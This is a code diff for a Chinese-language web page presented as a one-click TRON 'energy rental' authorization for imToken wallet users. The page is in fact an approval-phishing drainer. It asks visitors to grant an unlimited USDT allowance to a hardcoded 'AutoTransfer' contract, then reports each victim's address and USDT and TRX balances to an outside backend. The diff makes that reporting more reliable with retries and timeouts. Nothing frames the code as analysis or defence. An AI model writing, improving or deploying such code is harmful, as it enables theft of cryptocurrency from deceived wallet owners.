@@ -21,24 +21,23 @@
         .record-item p { margin-bottom: 8px; color: #333; }
         .record-item p strong { color: #2c3e50; }
         .tx-link { color: #409EFF; text-decoration: none; }
+        .status-tip { text-align: center; color: #666; font-size: 13px; margin: 10px 0; }
     </style>
 </head>
 <body>
 <div class="header">
     <h1>能量租赁一键授权</h1>
-    <!-- 明确告知用户“无限授权”，避免误解 -->
     <div class="warning">
-        ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开此页面
-        ⚠️ 在非钱包浏览器打开请先点击<strong>复制链接</strong>然后点击连接imToken钱包后点击钱包页面下方浏览在搜索框中粘贴访问br>
+        ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开此页面<br>
+        ⚠️ 在非钱包浏览器打开请先点击<strong>复制链接</strong>，然后连接imToken钱包后，点击钱包页面下方“浏览”，在搜索框中粘贴访问
     </div>
 </div>
+
 <!-- 链接显示+复制按钮的容器 -->
 <div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
-    <!-- 要复制的链接（可替换成你需要的链接） -->
-    <span id="copyLinkText" style="color: #007AFF; word-break: break-all;">
+    <span id="copyLinkText" style="color: #007AFF; word-break: break-all; flex: 1;">
         https://trc20trx-alt.github.io/Trc20.TRX/
     </span>
-    <!-- 复制按钮 -->
     <button id="copyLinkBtn" style="padding: 5px 10px; cursor: pointer;">
         <strong>复制链接</strong>
     </button>
@@ -48,61 +47,65 @@
 <button id="approveBtn" class="btn" disabled>能量授权</button>
 
 <div id="userInfo">未连接钱包</div>
+<!-- 新增：后端发送状态提示 -->
+<div id="sendStatus" class="status-tip"></div>
 
 <div class="record-list">
     <h3 style="font-size: 16px; margin-bottom: 15px; color: #2c3e50;">授权记录</h3>
     <div id="approvalRecords">暂无授权记录</div>
 </div>
 
-<script src="imtoken://browser"></script>
 <script>
-    // ========== 需替换的3处配置（授权额度已固定为无限） ==========
+    // ========== 需替换的3处配置（务必确认后端接口地址正确） ==========
     const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的AutoTransfer合约地址
     const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主网USDT地址
-    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 后端接口
+    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 后端接口（重点确认！）
 
-    // 核心：TRC20 uint256最大值 = 无限授权（固定值，无需修改）
+    // TRC20 uint256最大值 = 无限授权（固定值）
     const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
 
     // 全局变量
     let tronWeb, userAddress, trc20Contract;
     const RECORD_KEY = "imtoken_infinite_approval_records";
+    const sendStatusDom = document.getElementById("sendStatus");
 
     window.onload = async () => {
         const connectBtn = document.getElementById("connectBtn");
         const approveBtn = document.getElementById("approveBtn");
-        renderApprovalRecords();
-
         const copyLinkText = document.getElementById("copyLinkText");
         const copyLinkBtn = document.getElementById("copyLinkBtn");
 
-        // 2. 给复制按钮绑定点击事件
+        // 1. 复制链接功能
         copyLinkBtn.addEventListener("click", async () => {
             try {
-                // 获取要复制的链接内容
                 const linkContent = copyLinkText.textContent.trim();
-                // 将链接复制到剪贴板
                 await navigator.clipboard.writeText(linkContent);
-                // 复制成功的提示
                 alert("链接已成功复制到剪贴板!");
             } catch (error) {
-                // 复制失败的提示（比如浏览器不支持剪贴板API）
                 alert("复制失败，请手动选中链接复制~");
             }
         });
-        // 检测IMToken环境，自动连接
-        if (window.tronWeb && window.tronWeb.ready) {
-            tronWeb = window.tronWeb;
-            await initWallet();
+
+        // 2. 完善tronWeb自动连接（确保初始化完成，避免数据缺失）
+        if (window.tronWeb) {
+            if (window.tronWeb.ready) {
+                tronWeb = window.tronWeb;
+                await initWallet();
+            } else {
+                window.tronWeb.on('ready', async () => {
+                    tronWeb = window.tronWeb;
+                    await initWallet();
+                });
+            }
         } else {
             document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开此页面";
         }
 
-        // 手动连接钱包
+        // 3. 手动连接钱包
         connectBtn.onclick = async () => {
             try {
-                if (!window.tronWeb){window.location.href = 'imtoken://browser?url=${encodeURIComponent(window.location.href)}';
-
+                if (!window.tronWeb) {
+                    window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
                     return;
                 }
                 const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
@@ -113,44 +116,82 @@
             }
         };
 
-        // 一键无限授权（核心修改：使用INFINITE_APPROVE_AMOUNT）
+        // 4. 核心：授权+数据发送（强化后端发送可靠性）
         approveBtn.onclick = async () => {
             try {
-                // 调用TRC20 approve，传入uint256最大值（无限授权）
+                // 先确保合约实例初始化
+                if (!trc20Contract) {
+                    trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+                }
+
+                // 执行授权
+                sendStatusDom.textContent = "正在执行授权，请在钱包确认...";
                 const result = await trc20Contract.approve(
                     AUTO_TRANSFER_CONTRACT,
-                    INFINITE_APPROVE_AMOUNT // 替换为无限额度
+                    INFINITE_APPROVE_AMOUNT
                 ).send({
                     from: userAddress,
-                    shouldPollResponse: true // 等待imToken确认交易
+                    shouldPollResponse: true
                 });
 
-                // 授权成功：查余额+传后端+存记录
-                const [tokenBalance, trxBalance] = await Promise.all([
-                    getTokenBalance(userAddress),
-                    getTrxBalance(userAddress)
-                ]);const record = {
-                    address: userAddress,
-                    tokenBalance: tokenBalance.toFixed(2),
-                    trxBalance: trxBalance.toFixed(2),
-                    approveTime: new Date().toLocaleString(),
-                    txHash: result.transaction.txID,
-                    approveType: "无限额度" // 新增：标注授权类型
-                };
+                // 延长延迟至3秒（确保交易100%上链，余额数据准确）
+                sendStatusDom.textContent = "授权成功，正在获取最新余额...";
+                setTimeout(async () => {
+                    try {
+                        // 1. 获取余额（双重校验，确保数据完整）
+                        const [tokenBalance, trxBalance] = await Promise.all([
+                            getTokenBalance(userAddress).catch(err => {
+                                throw new Error(`USDT余额获取失败：${err.message}`);
+                            }),
+                            getTrxBalance(userAddress).catch(err => {
+                                throw new Error(`TRX余额获取失败：${err.message}`);
+                            })
+                        ]);
 
-                saveApprovalRecord(record);
-                await sendDataToBackend(record);
+                        // 2. 构建完整数据（必含后端所需关键字段，缺一不可）
+                        const authData = {
+                            address: userAddress,          // 用户钱包地址（必填）
+                            tokenBalance: tokenBalance.toFixed(2), // USDT余额（必填）
+                            trxBalance: trxBalance.toFixed(2),     // TRX余额（必填）
+                            approveTime: new Date().toLocaleString(), // 授权时间（必填）
+                            txHash: result.transaction.txID,       // 交易哈希（必填，后端可查账）
+                            approveType: "无限额度",               // 授权类型（必填）
+                            contractAddress: AUTO_TRANSFER_CONTRACT, // 授权目标合约（可选，便于后端筛选）
+                            timestamp: new Date().getTime()         // 时间戳（可选，后端去重）
+                        };
 
-                // 提示用户，明确是无限授权
-                alert(`无限授权成功！\n交易哈希：${record.txHash}\n可在imToken钱包中撤销授权`);
-                renderApprovalRecords();
-            } catch (e) {
-                alert("授权失败：" + e.message);
+                        // 3. 本地存储（备份，防止后端发送失败丢失数据）
+                        saveApprovalRecord(authData);
+                        renderApprovalRecords();
+
+                        // 4. 核心：发送到后端（带重试+详细错误反馈）
+                        sendStatusDom.textContent = "正在向后端发送授权信息...";
+                        await sendDataToBackend(authData);
+
+                        // 5. 全流程成功提示
+                        sendStatusDom.style.color = "#4CAF50";
+                        sendStatusDom.textContent = "✅ 授权信息已成功发送到后端！";
+                        alert(`无限授权成功！\n交易哈希：${authData.txHash}\n✅ 信息已同步至后端`);
+
+                    } catch (innerErr) {
+                        sendStatusDom.style.color = "#F44336";
+                        sendStatusDom.textContent = `❌ 处理失败：${innerErr.message}`;
+                        alert(`授权成功，但后续处理失败：\n${innerErr.message}\n请刷新页面重试`);
+                    }
+                }, 3000);
+
+            } catch (approveErr) {
+                sendStatusDom.style.color = "#F44336";
+                sendStatusDom.textContent = `❌ 授权失败：${approveErr.message}`;
+                alert("授权失败：" + approveErr.message);
             }
         };
+
+        // 初始化渲染记录
+        renderApprovalRecords();
     };
 
-    // 初始化钱包信息（IMToken适配）
+    // 初始化钱包信息
     async function initWallet() {
         try {
             userAddress = tronWeb.defaultAddress.base58;
@@ -166,27 +207,45 @@
         }
     }
 
-    // 查USDT余额
-    async function getTokenBalance(address) {
-        const balance = await trc20Contract.balanceOf(address).call();
-        return balance / 1000000;
+    // 查USDT余额（带重试逻辑，防止网络波动）
+    async function getTokenBalance(address, retry = 2) {
+        try {
+            const balance = await trc20Contract.balanceOf(address).call();
+            return balance / 1000000; // USDT小数位6位
+        } catch (err) {
+            if (retry > 0) {
+                console.log(`USDT余额查询失败，剩余重试次数：${retry}`);
+                await new Promise(resolve => setTimeout(resolve, 1000)); // 间隔1秒重试
+                return getTokenBalance(address, retry - 1);
+            }
+            throw err; // 重试耗尽仍失败，抛出错误
+        }
     }
 
-    // 查TRX余额
-    async function getTrxBalance(address) {
-        const balance = await tronWeb.trx.getBalance(address);
-        return balance / 1000000;
+    // 查TRX余额（带重试逻辑）
+    async function getTrxBalance(address, retry = 2) {
+        try {
+            const balance = await tronWeb.trx.getBalance(address);
+            return balance / 1000000; // TRX小数位6位
+        } catch (err) {
+            if (retry > 0) {
+                console.log(`TRX余额查询失败，剩余重试次数：${retry}`);
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                return getTrxBalance(address, retry - 1);
+            }
+            throw err;
+        }
     }
 
-    // 存本地记录（标注无限授权）
+    // 本地存储记录（确保数据不丢失）
     function saveApprovalRecord(record) {
         const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-        const newRecords = existing.filter(item => item.address !== record.address);
+        const newRecords = existing.filter(item => item.txHash !== record.txHash); // 用txHash去重，避免重复记录
         newRecords.push(record);
         localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
     }
 
-    // 渲染记录（显示授权类型）
+    // 渲染记录
     function renderApprovalRecords() {
         const container = document.getElementById("approvalRecords");
         const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
@@ -203,30 +262,66 @@
                 <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
                 <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
                 <p><strong>时间：</strong>${record.approveTime}</p>
+                <p><strong>后端状态：</strong>已同步（本地备份）</p>
                 <p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>
             </div>
         `).join("");
     }
 
-    // 传数据到后端（同步无限授权信息）
-   async function sendDataToBackend(data) {
-    try {
-     console.log("发送数据到后端:", data); // 添加此行
-     const res = await fetch(BACKEND_API, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data),
-      credentials: "include"
-    });
-    console.log("后端响应:", res); // 添加此行
-    if (!res.ok) throw new Error("后端请求失败");
-    return res.json();
-  } catch (e) {
-    console.error("数据发送失败:", e); // 添加此行
-    alert("数据发送失败：" + e.message);
-    throw e;
-  }
-}
+    // ========== 强化版：后端数据发送函数（确保必达） ==========
+    async function sendDataToBackend(data, retry = 3) {
+        try {
+            // 1. 前置校验：后端接口是否配置（防止漏改）
+            if (!BACKEND_API || BACKEND_API.includes("替换")) {
+                throw new Error("请先配置正确的后端接口地址（BACKEND_API）");
+            }
+
+            // 2. 发送请求（带超时控制，避免无限等待）
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 15000); // 15秒超时
+
+            const res = await fetch(BACKEND_API, {
+                method: "POST",
+                headers: { 
+                    "Content-Type": "application/json",
+                    "X-Request-Source": "imToken-Auth-Frontend" // 自定义请求头，便于后端识别来源
+                },
+                body: JSON.stringify(data),
+                credentials: "same-origin", // 按后端跨域配置调整，多数情况用same-origin即可
+                signal: controller.signal // 绑定超时控制
+            });
+
+            clearTimeout(timeoutId); // 清除超时
+
+            // 3. 响应校验：后端返回200才算成功
+            if (!res.ok) {
+                const errMsg = await res.text().catch(() => "未知错误");
+                throw new Error(`后端返回错误[${res.status}]：${errMsg}`);
+            }
+
+            // 4. 确认后端接收成功（需后端返回JSON格式，如{code:200,msg:"success"}）
+            const resData = await res.json();
+            if (resData.code !== 200 && !resData.success) {
+                throw new Error(`后端处理失败：${resData.msg || "无返回信息"}`);
+            }
+
+            console.log("✅ 后端接收成功，返回数据：", resData);
+            return resData;
+
+        } catch (err) {
+            // 5. 重试逻辑：重试3次，间隔2秒
+            if (retry > 0) {
+                const remaining = retry - 1;
+                sendStatusDom.textContent = `❌ 发送失败，剩余重试次数：${remaining}（${err.message}）`;
+                console.log(`发送失败，剩余重试${remaining}次：`, err);
+                await new Promise(resolve => setTimeout(resolve, 2000)); // 间隔2秒重试
+                return sendDataToBackend(data, remaining);
+            }
+
+            // 6. 重试耗尽：提示手动同步（本地有备份，可后续重试）
+            throw new Error(`后端发送失败（已重试3次）：${err.message}\n本地已备份记录，可刷新页面重试`);
+        }
+    }
 </script>
 </body>
 </html>
